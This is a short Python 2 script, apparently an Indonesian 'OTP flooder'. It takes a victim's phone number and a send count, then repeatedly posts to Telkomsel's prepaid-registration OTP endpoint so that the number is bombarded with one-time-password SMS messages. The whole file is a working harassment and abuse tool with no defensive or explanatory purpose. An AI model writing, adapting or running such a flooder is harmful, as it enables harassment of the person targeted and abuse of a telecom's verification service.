import requests
print "FLOODERS MANIA\nAUTHOR QIUBYzHUKHI"
nomor = raw_input("Masukkan no: ")
jml = raw_input("Jumlah SEND: ")
def nmr(n):
    url = "https://www.telkomsel.com/prepaid_registration/get_otp"
    print "Mengirim Password token ke: ", n
    data = {"phone": n}
    requests.session().post(url, data = data, verify=True)
if __name__ == "__main__":
    for i in range(0,int(jml)):
        nmr(nomor)
    print "[!]==== Selesai ====[!]"
